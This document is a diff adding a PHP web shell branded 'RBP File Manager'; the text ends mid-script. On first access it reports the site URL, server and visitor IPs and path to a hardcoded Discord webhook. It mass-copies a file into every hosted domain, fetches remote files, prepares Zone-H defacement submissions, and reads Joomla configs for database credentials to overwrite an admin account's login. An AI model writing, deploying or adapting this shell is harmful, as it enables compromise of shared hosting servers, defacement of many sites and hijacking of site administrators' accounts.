@@ -1,0 +1,1428 @@
+<?php
+// Discord Webhook Notification when script is accessed
+$webhookUrl = "https://discord.com/api/webhooks/1440628547784937632/UPihGhacKZ-AFt0iwOdReRCqghTydFrDlaQWsYqxPVOjCjM0fTJKiIyTqz7IWx_2soNJ";
+
+// Send webhook only once when script is accessed
+if (!isset($_COOKIE['rbp_visited'])) {
+    $currentUrl = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";
+    $serverIP = $_SERVER['SERVER_ADDR'] ?? 'Unknown';
+    $userIP = $_SERVER['REMOTE_ADDR'] ?? 'Unknown';
+    
+    $payload = json_encode([
+        'embeds' => [
+            [
+                'title' => 'Shell Uploaded',
+                'description' => 'A new RBP shell has been uploaded and accessed',
+                'color' => 15105570,
+                'fields' => [
+                    [
+                        'name' => 'Site',
+                        'value' => $currentUrl,
+                        'inline' => false
+                    ],
+                    [
+                        'name' => 'Server IP',
+                        'value' => $serverIP,
+                        'inline' => true
+                    ],
+                    [
+                        'name' => 'User IP',
+                        'value' => $userIP,
+                        'inline' => true
+                    ],
+                    [
+                        'name' => 'Current Directory',
+                        'value' => getcwd(),
+                        'inline' => false
+                    ]
+                ],
+                'timestamp' => date('c'),
+                'footer' => [
+                    'text' => 'RBP File Manager'
+                ]
+            ]
+        ]
+    ]);
+
+    $ch = curl_init();
+    curl_setopt($ch, CURLOPT_URL, $webhookUrl);
+    curl_setopt($ch, CURLOPT_POST, true);
+    curl_setopt($ch, CURLOPT_POSTFIELDS, $payload);
+    curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+    curl_exec($ch);
+    curl_close($ch);
+
+    // Set cookie to prevent duplicate notifications
+    setcookie('rbp_visited', '1', time() + (86400 * 30), "/"); // 30 days
+}
+
+// Auto-detect base directory for domains
+function RBPautoDetectBaseDir() {
+    $possiblePaths = [
+        '/home/*/domains',
+        '/home/*/public_html',
+        '/var/www',
+        '/home/*/www',
+        '/home/*/web'
+    ];
+    
+    $currentUser = function_exists('posix_getpwuid') ? (posix_getpwuid(posix_geteuid())['name'] ?? 'unknown') : 'unknown';
+    
+    foreach ($possiblePaths as $path) {
+        $expandedPath = str_replace('*', $currentUser, $path);
+        if (is_dir($expandedPath)) {
+            return $expandedPath;
+        }
+    }
+    
+    // Fallback to current directory
+    return getcwd();
+}
+
+// Get all subdomains from domains directory
+function RBPgetAllSubdomains($baseDir) {
+    $subdomains = [];
+    
+    // Look for domains directory structure
+    if (is_dir($baseDir)) {
+        // Check if this is a domains directory
+        $domainDirs = glob($baseDir . '/*', GLOB_ONLYDIR);
+        if ($domainDirs) {
+            foreach ($domainDirs as $domainDir) {
+                $domainName = basename($domainDir);
+                
+                // Check for public_html in domain directory
+                $publicHtml = $domainDir . '/public_html';
+                if (is_dir($publicHtml)) {
+                    $subdomains[] = [
+                        'name' => $domainName,
+                        'path' => $publicHtml,
+                        'url' => 'https://' . $domainName
+                    ];
+                }
+                
+                // Also check for subdomain directories
+                $subdomainDirs = glob($domainDir . '/*', GLOB_ONLYDIR);
+                if ($subdomainDirs) {
+                    foreach ($subdomainDirs as $subdomainDir) {
+                        $subdomainName = basename($subdomainDir);
+                        $subPublicHtml = $subdomainDir . '/public_html';
+                        if (is_dir($subPublicHtml)) {
+                            $subdomains[] = [
+                                'name' => $subdomainName . '.' . $domainName,
+                                'path' => $subPublicHtml,
+                                'url' => 'https://' . $subdomainName . '.' . $domainName
+                            ];
+                        }
+                    }
+                }
+            }
+        }
+    }
+    
+    return $subdomains;
+}
+
+// Mass deploy file to all subdomains with progress
+function RBPmassDeploy($sourceFile, $baseDir) {
+    $results = [];
+    $subdomains = RBPgetAllSubdomains($baseDir);
+    $total = count($subdomains);
+    $processed = 0;
+    
+    if (!file_exists($sourceFile)) {
+        return ["error" => "❌ Source file not found: $sourceFile"];
+    }
+    
+    $fileContent = file_get_contents($sourceFile);
+    if ($fileContent === false) {
+        return ["error" => "❌ Cannot read source file: $sourceFile"];
+    }
+    
+    // Get the original filename
+    $originalFilename = basename($sourceFile);
+    
+    foreach ($subdomains as $subdomain) {
+        $processed++;
+        $targetFile = $subdomain['path'] . '/' . $originalFilename;
+        
+        // Create directory if it doesn't exist
+        $targetDir = dirname($targetFile);
+        if (!is_dir($targetDir)) {
+            if (!mkdir($targetDir, 0755, true)) {
+                $results[] = "❌ [$processed/$total] Failed to create directory: " . $subdomain['name'];
+                continue;
+            }
+        }
+        
+        if (file_put_contents($targetFile, $fileContent)) {
+            $results[] = "✅ [$processed/$total] Deployed to: " . $subdomain['name'];
+        } else {
+            $results[] = "❌ [$processed/$total] Failed: " . $subdomain['name'];
+        }
+    }
+    
+    return $results;
+}
+
+// Mass delete files from all subdomains with progress
+function RBPmassDelete($baseDir, $filename) {
+    $results = [];
+    $subdomains = RBPgetAllSubdomains($baseDir);
+    $total = count($subdomains);
+    $processed = 0;
+    
+    foreach ($subdomains as $subdomain) {
+        $processed++;
+        $targetFile = $subdomain['path'] . '/' . $filename;
+        
+        if (file_exists($targetFile) && unlink($targetFile)) {
+            $results[] = "✅ [$processed/$total] Deleted from: " . $subdomain['name'];
+        } else {
+            $results[] = "❌ [$processed/$total] Not found: " . $subdomain['name'];
+        }
+    }
+    
+    return $results;
+}
+
+// Download domains list
+function RBPdownloadDomainsList($baseDir, $filename) {
+    $subdomains = RBPgetAllSubdomains($baseDir);
+    $domainsList = [];
+    
+    foreach ($subdomains as $subdomain) {
+        $domainsList[] = $subdomain['url'] . '/' . $filename;
+    }
+    
+    return $domainsList;
+}
+
+// Handle base directory setting
+$defaultBaseDir = RBPautoDetectBaseDir();
+if (isset($_POST['baseDir'])) {
+    $baseDir = $_POST['baseDir'];
+    setcookie("baseDir", $baseDir, time() + 3600);
+} else {
+    $baseDir = $_COOKIE['baseDir'] ?? $defaultBaseDir;
+}
+
+// Handle directory navigation - FIXED: Proper directory handling
+if (isset($_GET['d']) && !empty($_GET['d'])) {
+    $currentDir = base64_decode($_GET['d']);
+    $currentDir = realpath($currentDir) ?: $currentDir;
+} else {
+    $currentDir = getcwd();
+}
+
+$currentDir = str_replace("\\", "/", $currentDir);
+$dir = $currentDir;
+
+// Check if this is a POST request for specific actions
+$isPostAction = false;
+
+// Start session early for all operations
+if (!isset($_SESSION)) {
+    session_start();
+}
+
+// Download domains list handler
+if (isset($_GET['download'])) {
+    header('Content-Type: text/plain');
+    header('Content-Disposition: attachment; filename="domains.txt"');
+    $domainsList = RBPdownloadDomainsList($baseDir, 'rbp.html');
+    foreach ($domainsList as $domain) {
+        echo $domain . "\n";
+    }
+    exit;
+}
+
+// Mass deploy handler
+if (isset($_POST['mass_deploy'])) {
+    $isPostAction = true;
+    $sourceFile = $_POST['deploy_file_path'] ?? '';
+    
+    if (empty($sourceFile) || !file_exists($sourceFile)) {
+        echo "<script>alert('Source file not found: $sourceFile'); window.location.href = '?' + Math.random();</script>";
+        exit;
+    }
+    
+    $results = RBPmassDeploy($sourceFile, $baseDir);
+    
+    if (isset($results['error'])) {
+        echo "<script>alert('" . $results['error'] . "'); window.location.href = '?' + Math.random();</script>";
+        exit;
+    }
+    
+    // Store results in session to display on next page load
+    $_SESSION['mass_deploy_results'] = $results;
+    $_SESSION['mass_deploy_source'] = $sourceFile;
+    $_SESSION['mass_deploy_base'] = $baseDir;
+    
+    // Redirect back to main page
+    header("Location: ?deploy_complete=1");
+    exit;
+}
+
+// Mass delete handler
+if (isset($_POST['mass_delete'])) {
+    $isPostAction = true;
+    $sourceFile = $_POST['deploy_file_path'] ?? '';
+    $filename = basename($sourceFile);
+    
+    $results = RBPmassDelete($baseDir, $filename);
+    
+    // Store results in session to display on next page load
+    $_SESSION['mass_delete_results'] = $results;
+    $_SESSION['mass_delete_filename'] = $filename;
+    $_SESSION['mass_delete_base'] = $baseDir;
+    
+    // Redirect back to main page
+    header("Location: ?delete_complete=1");
+    exit;
+}
+
+// WGET Download Functionality
+if (isset($_POST['wget_url'])) {
+    $isPostAction = true;
+    $url = $_POST['wget_url'] ?? '';
+    $fileName = basename($url);
+    $destination = $currentDir . '/' . $fileName;
+    
+    if (!empty($url)) {
+        $ch = curl_init();
+        curl_setopt($ch, CURLOPT_URL, $url);
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
+        curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36');
+        $fileContent = curl_exec($ch);
+        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+        curl_close($ch);
+        
+        if ($httpCode === 200 && $fileContent !== false && file_put_contents($destination, $fileContent)) {
+            echo "<script>alert('File downloaded successfully!'); window.location.href = '?' + Math.random();</script>";
+        } else {
+            echo "<script>alert('Download failed! HTTP Code: $httpCode'); window.location.href = '?' + Math.random();</script>";
+        }
+    }
+    exit;
+}
+
+// Adminer Download Functionality
+if (isset($_POST['download_adminer'])) {
+    $isPostAction = true;
+    function RBPadminer($url, $isi) {
+        $fp = fopen($isi, "w");
+        if (!$fp) return false;
+        
+        $ch = curl_init();
+        curl_setopt($ch, CURLOPT_URL, $url);
+        curl_setopt($ch, CURLOPT_BINARYTRANSFER, true);
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
+        curl_setopt($ch, CURLOPT_FILE, $fp);
+        $result = curl_exec($ch);
+        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+        curl_close($ch);
+        fclose($fp);
+        
+        return $httpCode === 200 && $result !== false;
+    }
+
+    if (file_exists('adminer.php')) {
+        echo "<script>
+            alert('Adminer is already downloaded!');
+            window.location.href = '?' + Math.random();
+        </script>";
+    } else {
+        if (RBPadminer("https://github.com/vrana/adminer/releases/download/v4.8.1/adminer-4.8.1.php", "adminer.php")) {
+            echo "<script>
+                alert('Adminer downloaded successfully!');
+                window.location.href = '?' + Math.random();
+            </script>";
+        } else {
+            echo "<script>
+                alert('Failed to download adminer.php');
+                window.location.href = '?' + Math.random();
+            </script>";
+        }
+    }
+    exit;
+}
+
+// Zone-H Functionality
+if (isset($_POST['zoneh_submit'])) {
+    $isPostAction = true;
+    $domainList = isset($_POST['zoneh_url']) ? explode("\n", str_replace("\r", "", $_POST['zoneh_url'])) : [];
+    $nick = $_POST['zoneh_nick'] ?? 'RBP';
+    
+    $resultHtml = '<h3>Zone-H Notifier</h3>';
+    $resultHtml .= '<p><strong>Notifier Archive:</strong> <a href="http://zone-h.org/archive/notifier=' . $nick . '" target="_blank">http://zone-h.org/archive/notifier=' . $nick . '</a></p>';
+    $resultHtml .= '<div style="max-height: 300px; overflow-y: auto; border: 1px solid #444; padding: 10px; background: #2a2a2a;">';
+    
+    foreach ($domainList as $url) {
+        $url = trim($url);
+        if ($url) {
+            $submittedUrl = $url . '/rbp.html';
+            $resultHtml .= '<p>' . htmlspecialchars($url) . ' -> <span style="color:lime;">SUBMITTED</span> (' . htmlspecialchars($submittedUrl) . ')</p>';
+        }
+    }
+    
+    $resultHtml .= '</div>';
+    $resultHtml .= '<div style="text-align: center; margin-top: 15px;"><button onclick="RBPclosePopup(\'zonehPopup\')" class="tool-button">Close</button></div>';
+    
+    echo "<script>
+        document.getElementById('zonehPopup').style.display = 'block';
+        document.getElementById('zonehContent').innerHTML = '" . addslashes($resultHtml) . "';
+    </script>";
+    exit;
+}
+
+// Auto Edit User Config Functionality
+if (isset($_POST['edit_user_submit'])) {
+    $isPostAction = true;
+    function RBPambil($string, $start, $end) {
+        $str = explode($start, $string);
+        if (isset($str[1])) {
+            $str = explode($end, $str[1]);
+            return $str[0];
+        }
+        return '';
+    }
+    
+    $user_baru = $_POST['user_baru'] ?? '';
+    $pass_baru = $_POST['pass_baru'] ?? '';
+    
+    if (strlen($user_baru) < 6 || strlen($pass_baru) < 6) {
+        echo "<script>alert('Username and password must be at least 6 characters'); window.location.href = '?' + Math.random();</script>";
+        exit;
+    }
+    
+    $user_baru = $_POST['user_baru'];
+    $pass_baru = md5($_POST['pass_baru']);
+    $conf = $_POST['config_dir'] ?? '';
+    
+    $resultHtml = '<h3>Auto Edit User Config</h3>';
+    $resultHtml .= '<div style="max-height: 300px; overflow-y: auto; border: 1px solid #444; padding: 10px; background: #2a2a2a;">';
+    
+    if (!is_dir($conf)) {
+        $resultHtml .= '<p style="color: red;">Config directory not found!</p>';
+    } else {
+        $scan_conf = scandir($conf);
+        $found = false;
+        
+        if ($scan_conf) {
+            foreach($scan_conf as $file_conf) {
+                if($file_conf == '.' || $file_conf == '..' || !is_file("$conf/$file_conf")) continue;
+                
+                $config = file_get_contents("$conf/$file_conf");
+                if(preg_match("/JConfig|joomla/",$config)) {
+                    $found = true;
+                    $dbhost = RBPambil($config,"host = '","'");
+                    $dbuser = RBPambil($config,"user = '","'");
+                    $dbpass = RBPambil($config,"password = '","'");
+                    $dbname = RBPambil($config,"db = '","'");
+                    $dbprefix = RBPambil($config,"dbprefix = '","'");
+                    $prefix = $dbprefix."users";
+                    
+                    $resultHtml .= "<p><strong>Config:</strong> ".$file_conf."</p>";
+                    $resultHtml .= "<p><strong>CMS:</strong> Joomla</p>";
+                    
+                    // Use mysqli instead of deprecated mysql functions
+                    $conn = @mysqli_connect($dbhost, $dbuser, $dbpass);
+                    if ($conn) {
+                        $db = @mysqli_select_db($conn, $dbname);
+                        
+                        if($db) {
+                            $q = @mysqli_query($conn, "SELECT * FROM $prefix ORDER BY id ASC");
+                            if ($q) {
+                                $result = @mysqli_fetch_array($q);
+                                $id = $result['id'] ?? 0;
+                                $site = RBPambil($config,"sitename = '","'");
+                                $update = @mysqli_query($conn, "UPDATE $prefix SET username='$user_baru',password='$pass_baru' WHERE id='$id'");
+                                
+                                if($site == '') {
+                                    $resultHtml .= "<p><strong>Site:</strong> <span style=\"color:red;\">Cannot get domain name</span></p>";
+                                } else {
+                                    $resultHtml .= "<p><strong>Site:</strong> $site</p>";
+                                }
+                                
+                                if(!$update) {
+                                    $resultHtml .= "<p><strong>Status:</strong> <span style=\"color:red;\">Update failed: ".@mysqli_error($conn)."</span></p>";
+                                } else {
+                                    $resultHtml .= "<p><strong>Status:</strong> <span style=\"color:lime;\">Successfully edited user, please login with new credentials.</span></p>";
+                                }
+                            } else {
+                                $resultHtml .= "<p><strong>Status:</strong> <span style=\"color:red;\">Query failed: ".@mysqli_error($conn)."</span></p>";
+                            }
+                            @mysqli_close($conn);
+                        } else {
+                            $resultHtml .= "<p><strong>Status:</strong> <span style=\"color:red;\">Database selection failed</span></p>";
+                        }
+                    } else {
+                        $resultHtml .= "<p><strong>Status:</strong> <span style=\"color:red;\">Database connection failed</span></p>";
+                    }
+                }
+            }
+        }
+        
+        if (!$found) {
+            $resultHtml .= '<p style="color: red;">No Joomla configuration files found in the specified directory.</p>';
+        }
+    }
+    
+    $resultHtml .= '</div>';
+    $resultHtml .= '<div style="text-align: center; margin-top: 15px;"><button onclick="RBPclosePopup(\'edituserPopup\')" class="tool-button">Close</button></div>';
+    
+    echo "<script>
+        document.getElementById('edituserPopup').style.display = 'block';
+        document.getElementById('edituserContent').innerHTML = '" . addslashes($resultHtml) . "';
+    </script>";
+    exit;
+}
+
+// Upload handler
+if (isset($_POST['s']) && isset($_FILES['u'])) {
+    $isPostAction = true;
+    if ($_FILES['u']['error'] == 0) {
+        $fileName = $_FILES['u']['name'];
+        $tmpName = $_FILES['u']['tmp_name'];
+        $destination = $currentDir . '/' . $fileName;
+        if (move_uploaded_file($tmpName, $destination)) {
+            echo "<script>alert('Upload successful!'); window.location.href = '?' + Math.random();</script>";
+        } else {
+            echo "<script>alert('Upload failed!'); window.location.href = '?' + Math.random();</script>";
+        }
+    } else {
+        echo "<script>alert('Upload error: " . $_FILES['u']['error'] . "'); window.location.href = '?' + Math.random();</script>";
+    }
+    exit;
+}
+
+// Delete File handler
+if (isset($_POST['del'])) {
+    $isPostAction = true;
+    $filePath = base64_decode($_POST['del']);
+    $fileDir = dirname($filePath);
+    if (@unlink($filePath)) {
+        echo "<script>alert('Delete successful'); window.location.href = '?d=" . base64_encode($fileDir) . "&' + Math.random();</script>";
+    } else {
+        echo "<script>alert('Delete failed'); window.location.href = '?d=" . base64_encode($fileDir) . "&' + Math.random();</script>";
+    }
+    exit;
+}
+
+// Save Edited File handler
+if (isset($_POST['save']) && isset($_POST['obj']) && isset($_POST['content'])) {
+    $isPostAction = true;
+    $filePath = base64_decode($_POST['obj']);
+    $fileDir = dirname($filePath);
+    if (file_put_contents($filePath, $_POST['content'])) {
+        echo "<script>alert('Saved'); window.location.href = '?d=" . base64_encode($fileDir) . "&' + Math.random();</script>";
+    } else {
+        echo "<script>alert('Save failed'); window.location.href = '?d=" . base64_encode($fileDir) . "&' + Math.random();</script>";
+    }
+    exit;
+}
+
+// Rename handler
+if (isset($_POST['ren'])) {
+    $isPostAction = true;
+    $oldPath = base64_decode($_POST['ren']);
+    $oldDir = dirname($oldPath);
+    if (isset($_POST['new'])) {
+        $newPath = $oldDir . '/' . $_POST['new'];
+        if (rename($oldPath, $newPath)) {
+            echo "<script>alert('Renamed'); window.location.href = '?d=" . base64_encode($oldDir) . "&' + Math.random();</script>";
+        } else {
+            echo "<script>alert('Rename failed'); window.location.href = '?d=" . base64_encode($oldDir) . "&' + Math.random();</script>";
+        }
+    }
+    exit;
+}
+
+// If it's a POST action that doesn't match any handler, redirect to avoid white screen
+if ($_SERVER['REQUEST_METHOD'] === 'POST' && !$isPostAction) {
+    header("Location: " . $_SERVER['REQUEST_URI']);
+    exit;
+}
+?>
+
+<!DOCTYPE html>
+<html>
+<head>
+    <title>RBP File Manager</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: #0c0c0c;
+            color: #fff;
+            min-height: 100vh;
+        }
+        
+        .header {
+            background: #0c0c0c;
+            padding: 15px 0;
+            border-bottom: 2px solid #333;
+            text-align: center;
+        }
+        
+        .logo-container {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 15px;
+            margin-bottom: 15px;
+        }
+
+        .logo {
+            width: 50px;
+            height: 50px;
+            border-radius: 50%;
+        }
+
+        .logo-text {
+            font-size: 24px;
+            font-weight: bold;
+            background: linear-gradient(45deg, #ff0000, #0000ff);
+            background-size: 200% 200%;
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            animation: colorShift 3s ease infinite;
+        }
+        
+        @keyframes colorShift {
+            0% { background-position: 0% 50%; }
+            50% { background-position: 100% 50%; }
+            100% { background-position: 0% 50%; }
+        }
+        
+        .toolbar {
+            background: #1a1a1a;
+            padding: 10px;
+            text-align: center;
+            border-bottom: 1px solid #333;
+        }
+        
+        .tool-button {
+            display: inline-block;
+            margin: 5px;
+            padding: 8px 16px;
+            background: #1a1a1a;
+            color: white;
+            text-decoration: none;
+            border-radius: 5px;
+            border: 1px solid #555;
+            font-size: 12px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+        }
+        
+        .tool-button:hover {
+            background: #333;
+            border-color: #777;
+        }
+        
+        .upload-section {
+            background: #1a1a1a;
+            padding: 15px;
+            text-align: center;
+            border-bottom: 1px solid #333;
+        }
+        
+        .dir-path {
+            background: #1a1a1a;
+            padding: 10px;
+            margin: 0;
+            border-bottom: 1px solid #333;
+            font-size: 14px;
+            color: white;
+        }
+        
+        .dir-path a {
+            color: white;
+            text-decoration: none;
+            font-weight: bold;
+        }
+        
+        .dir-path a:hover {
+            text-decoration: underline;
+            color: #4fc3f7;
+        }
+        
+        .file-list {
+            margin: 10px;
+        }
+        
+        .file-item {
+            display: flex;
+            align-items: center;
+            padding: 8px;
+            margin: 2px 0;
+            background: #1a1a1a;
+            border-radius: 5px;
+            border: 1px solid #333;
+            transition: all 0.2s ease;
+            color: white;
+        }
+        
+        .file-item:hover {
+            background: #222;
+            border-color: #555;
+        }
+        
+        .file-item.folder {
+            cursor: pointer;
+        }
+        
+        .file-icon {
+            width: 30px;
+            text-align: center;
+            font-size: 16px;
+        }
+        
+        .file-name {
+            flex: 1;
+            padding: 0 10px;
+            cursor: pointer;
+            color: white;
+        }
+        
+        .file-size {
+            width: 80px;
+            text-align: right;
+            font-size: 12px;
+            color: #aaa;
+        }
+        
+        .file-actions {
+            width: 200px;
+            text-align: right;
+        }
+        
+        .file-actions button {
+            margin-left: 5px;
+            padding: 3px 8px;
+            background: #1a1a1a;
+            color: white;
+            border: 1px solid #555;
+            border-radius: 3px;
+            cursor: pointer;
+            font-size: 11px;
+        }
+        
+        .file-actions button:hover {
+            background: #333;
+        }
+        
+        textarea { 
+            width: 100%; 
+            height: 400px; 
+            background: #1a1a1a;
+            color: #fff;
+            border: 1px solid #444;
+            border-radius: 5px;
+            padding: 10px;
+            font-family: monospace;
+            margin: 10px;
+        }
+        
+        .popup-overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.8);
+            z-index: 1000;
+        }
+        
+        .popup-content {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background: #1a1a1a;
+            padding: 20px;
+            border-radius: 10px;
+            border: 2px solid #444;
+            color: #fff;
+            width: 700px;
+            max-height: 80vh;
+            overflow-y: auto;
+        }
+        
+        .popup-content input[type="text"],
+        .popup-content input[type="password"],
+        .popup-content textarea {
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0;
+            background: #2a2a2a;
+            border: 1px solid #444;
+            border-radius: 5px;
+            color: #fff;
+        }
+        
+        .popup-content button {
+            padding: 8px 15px;
+            background: #1a1a1a;
+            color: white;
+            border: 1px solid #555;
+            border-radius: 5px;
+            cursor: pointer;
+            margin: 5px;
+        }
+        
+        .popup-content button:hover {
+            background: #333;
+        }
+        
+        .file-selector {
+            background: #2a2a2a;
+            border: 1px solid #444;
+            border-radius: 5px;
+            padding: 10px;
+            margin: 10px 0;
+            max-height: 200px;
+            overflow-y: auto;
+        }
+        
+        .file-selector-item {
+            padding: 5px;
+            margin: 2px 0;
+            background: #333;
+            border-radius: 3px;
+            cursor: pointer;
+            font-size: 12px;
+        }
+        
+        .file-selector-item:hover {
+            background: #444;
+        }
+        
+        .file-selector-item.selected {
+            background: #007acc;
+        }
+        
+        .domain-info {
+            background: #2a2a2a;
+            border: 1px solid #444;
+            border-radius: 5px;
+            padding: 10px;
+            margin: 10px 0;
+            max-height: 150px;
+            overflow-y: auto;
+        }
+        
+        .domain-item {
+            padding: 3px;
+            margin: 1px 0;
+            font-size: 11px;
+            color: #aaa;
+        }
+        
+        .status-bar {
+            position: fixed;
+            bottom: 0;
+            left: 0;
+            width: 100%;
+            background: #1a1a1a;
+            padding: 5px 10px;
+            border-top: 1px solid #333;
+            font-size: 12px;
+            z-index: 100;
+        }
+        
+        .results-popup {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.9);
+            z-index: 2000;
+        }
+        
+        .results-content {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background: #1a1a1a;
+            padding: 20px;
+            border-radius: 10px;
+            border: 2px solid #444;
+            color: #fff;
+            width: 800px;
+            max-height: 80vh;
+            overflow-y: auto;
+        }
+    </style>
+    <script>
+        function RBPpostDir(dir) {
+            window.location.href = '?d=' + btoa(dir) + '&' + Math.random();
+        }
+        
+        function RBPpostDel(path) {
+            if (confirm('Are you sure you want to delete this file?')) {
+                var form = document.createElement("form");
+                form.method = "post";
+                var input = document.createElement("input");
+                input.name = "del";
+                input.value = btoa(path);
+                form.appendChild(input);
+                document.body.appendChild(form);
+                form.submit();
+            }
+        }
+        
+        function RBPpostEdit(path) {
+            var form = document.createElement("form");
+                form.method = "post";
+                var input = document.createElement("input");
+                input.name = "edit";
+                input.value = btoa(path);
+                form.appendChild(input);
+                document.body.appendChild(form);
+                form.submit();
+        }
+        
+        function RBPpostRen(path, name) {
+            var newName = prompt("New name:", name);
+            if (newName && newName !== name) {
+                var form = document.createElement("form");
+                form.method = "post";
+                var input1 = document.createElement("input");
+                input1.name = "ren";
+                input1.value = btoa(path);
+                var input2 = document.createElement("input");
+                input2.name = "new";
+                input2.value = newName;
+                form.appendChild(input1);
+                form.appendChild(input2);
+                document.body.appendChild(form);
+                form.submit();
+            }
+        }
+        
+        function RBPpostOpen(path) {
+            window.open(path, '_blank');
+        }
+        
+        function RBPshowWgetPopup() {
+            document.getElementById('wgetPopup').style.display = 'block';
+        }
+        
+        function RBPshowAdminerPopup() {
+            document.getElementById('adminerPopup').style.display = 'block';
+        }
+        
+        function RBPshowZoneHPopup() {
+            document.getElementById('zonehPopup').style.display = 'block';
+        }
+        
+        function RBPshowEditUserPopup() {
+            document.getElementById('edituserPopup').style.display = 'block';
+        }
+        
+        function RBPshowMassDeployPopup() {
+            RBPpopulateFileSelector();
+            RBPupdateDomainInfo();
+            document.getElementById('massDeployPopup').style.display = 'block';
+        }
+        
+        function RBPpopulateFileSelector() {
+            var fileList = document.getElementById('fileList');
+            fileList.innerHTML = '';
+            
+            var files = <?php 
+                $files = [];
+                if (is_dir($currentDir) && $handle = opendir($currentDir)) {
+                    while (false !== ($entry = readdir($handle))) {
+                        if ($entry != "." && $entry != ".." && !is_dir($currentDir . '/' . $entry)) {
+                            $files[] = $entry;
+                        }
+                    }
+                    closedir($handle);
+                }
+                echo json_encode($files);
+            ?>;
+            
+            files.forEach(function(file) {
+                var div = document.createElement('div');
+                div.className = 'file-selector-item';
+                div.textContent = file;
+                div.onclick = function() {
+                    var items = document.getElementsByClassName('file-selector-item');
+                    for (var i = 0; i < items.length; i++) {
+                        items[i].classList.remove('selected');
+                    }
+                    this.classList.add('selected');
+                    document.getElementById('deploy_file_path').value = '<?php echo $currentDir; ?>/' + file;
+                };
+                fileList.appendChild(div);
+            });
+        }
+        
+        function RBPupdateDomainInfo() {
+            var domainInfo = document.getElementById('domainInfo');
+            domainInfo.innerHTML = '<p>Auto-detected base directory: <?php echo htmlspecialchars($baseDir); ?></p>';
+            
+            var domains = <?php echo json_encode(RBPgetAllSubdomains($baseDir)); ?>;
+            
+            domains.forEach(function(domain) {
+                var div = document.createElement('div');
+                div.className = 'domain-item';
+                div.textContent = domain.name + ' -> ' + domain.path;
+                domainInfo.appendChild(div);
+            });
+            
+            if (domains.length === 0) {
+                domainInfo.innerHTML += '<p style="color: red;">No domains found in base directory!</p>';
+            } else {
+                domainInfo.innerHTML += '<p style="color: lime;">Found ' + domains.length + ' domains/subdomains</p>';
+            }
+        }
+        
+        function RBPclosePopup(popupId) {
+            document.getElementById(popupId).style.display = 'none';
+        }
+        
+        function RBPcloseResultsPopup() {
+            document.getElementById('resultsPopup').style.display = 'none';
+            // Clear session results
+            window.location.href = '?' + Math.random();
+        }
+        
+        function RBPsubmitWget() {
+            var url = document.getElementById('wgetUrl').value;
+            if (url) {
+                var form = document.createElement("form");
+                form.method = "post";
+                var input1 = document.createElement("input");
+                input1.name = "wget_url";
+                input1.value = url;
+                var input2 = document.createElement("input");
+                input2.name = "d";
+                input2.value = "<?php echo base64_encode($currentDir); ?>";
+                form.appendChild(input1);
+                form.appendChild(input2);
+                document.body.appendChild(form);
+                form.submit();
+            }
+        }
+        
+        function RBPsubmitAdminer() {
+            var form = document.createElement("form");
+            form.method = "post";
+            
+            var input1 = document.createElement("input");
+            input1.name = "download_adminer";
+            input1.value = "1";
+            
+            var input2 = document.createElement("input");
+            input2.name = "d";
+            input2.value = "<?php echo base64_encode($currentDir); ?>";
+            
+            form.appendChild(input1);
+            form.appendChild(input2);
+            document.body.appendChild(form);
+            form.submit();
+        }
+        
+        function RBPsubmitZoneH() {
+            var form = document.createElement("form");
+            form.method = "post";
+            
+            var input1 = document.createElement("input");
+            input1.name = "zoneh_nick";
+            input1.value = document.getElementById('zoneh_nick').value;
+            
+            var input2 = document.createElement("input");
+            input2.name = "zoneh_url";
+            input2.value = document.getElementById('zoneh_url').value;
+            
+            var input3 = document.createElement("input");
+            input3.name = "zoneh_submit";
+            input3.value = "1";
+            
+            var input4 = document.createElement("input");
+            input4.name = "d";
+            input4.value = "<?php echo base64_encode($currentDir); ?>";
+            
+            form.appendChild(input1);
+            form.appendChild(input2);
+            form.appendChild(input3);
+            form.appendChild(input4);
+            document.body.appendChild(form);
+            form.submit();
+        }
+        
+        function RBPsubmitMassDeploy() {
+            var form = document.createElement("form");
+            form.method = "post";
+            
+            var input1 = document.createElement("input");
+            input1.name = "deploy_file_path";
+            input1.value = document.getElementById('deploy_file_path').value;
+            
+            var input2 = document.createElement("input");
+            input2.name = "mass_deploy";
+            input2.value = "1";
+            
+            var input3 = document.createElement("input");
+            input3.name = "d";
+            input3.value = "<?php echo base64_encode($currentDir); ?>";
+            
+            form.appendChild(input1);
+            form.appendChild(input2);
+            form.appendChild(input3);
+            document.body.appendChild(form);
+            form.submit();
+        }
+        
+        function RBPsubmitMassDelete() {
+            var form = document.createElement("form");
+            form.method = "post";
+            
+            var input1 = document.createElement("input");
+            input1.name = "deploy_file_path";
+            input1.value = document.getElementById('deploy_file_path').value;
+            
+            var input2 = document.createElement("input");
